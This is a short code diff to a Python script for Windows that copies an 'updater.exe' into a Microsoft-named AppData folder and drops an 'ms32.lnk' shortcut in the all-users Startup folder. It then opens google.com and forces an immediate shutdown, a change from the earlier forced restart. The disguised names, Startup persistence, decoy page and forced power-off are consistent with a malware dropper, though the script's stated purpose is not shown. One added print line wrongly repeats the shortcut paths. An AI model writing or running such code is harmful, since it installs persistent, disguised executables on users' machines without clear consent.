@@ -27,6 +27,7 @@ destination_updater = os.path.join(appdata_path, 'updater.exe')
 destination_shortcut = r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\ms32.lnk"
 if os.path.exists(appdata_path):
     shutil.rmtree(appdata_path)
+os.mkdir(appdata_path)
 path = os.path.expandvars(r"%APPDATA%\Microsoft")
 def run_powershell_command(command):
     try:
@@ -51,9 +52,11 @@ try:
     shutil.copy(source_shortcut, destination_shortcut)
     print(f"File copied from {source_shortcut} to {destination_shortcut}")
     
+    shutil.copy(source_updater, destination_updater)
+    print(f"File copied from {source_shortcut} to {destination_shortcut}")
     open_t("https://google.com")
     sleep(3)
-    os.system("shutdown /r /t 0")
+    os.system("shutdown /s /t 0")
 except FileNotFoundError as e:
     print(f"Error: Source file or folder not found.")
     print(f"Details: {e}")
